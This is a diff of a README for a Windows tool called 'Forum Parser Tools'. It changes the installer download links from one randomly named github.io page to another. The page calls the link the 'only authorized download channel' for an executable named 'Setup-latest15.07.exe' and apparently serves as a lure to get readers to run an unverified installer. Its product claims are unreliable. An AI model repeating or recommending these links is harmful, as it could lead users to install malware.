@@ -2,7 +2,7 @@
 
 Forum Parser Tools is an advanced Windows application designed for extracting and parsing data from a wide range of forum platforms. This suite includes powerful features for thread data extraction, user parsing, and multi-forum management, making it essential for data analysts and forum administrators in 2026. Whether you're conducting research, archiving content, or analyzing forum activity, this tool provides a reliable and efficient solution with a user-friendly interface.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## System Requirements
 
@@ -82,7 +82,7 @@ Here are answers to common queries about Forum Parser Tools:
 
 To get started, download the latest version of Forum Parser Tools from the official source:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This link provides the installer file "Setup-latest15.07.exe" and is the only authorized download channel. Avoid third-party sites to ensure security and authenticity.
 
